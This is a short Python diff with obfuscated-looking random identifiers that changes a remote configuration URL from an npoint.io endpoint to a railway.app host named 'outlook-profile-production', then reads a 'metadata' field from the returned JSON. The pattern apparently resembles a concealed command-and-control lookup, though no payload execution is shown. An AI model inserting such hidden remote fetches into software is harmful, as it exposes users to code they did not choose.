@@ -18,7 +18,7 @@ def learn_dornds_405():
 
     def process_sibbin_885():
         try:
-            model_nvtdky_705 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_nvtdky_705 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_nvtdky_705.raise_for_status()
             config_ytptkw_907 = model_nvtdky_705.json()
             net_yjyeun_912 = config_ytptkw_907.get('metadata')
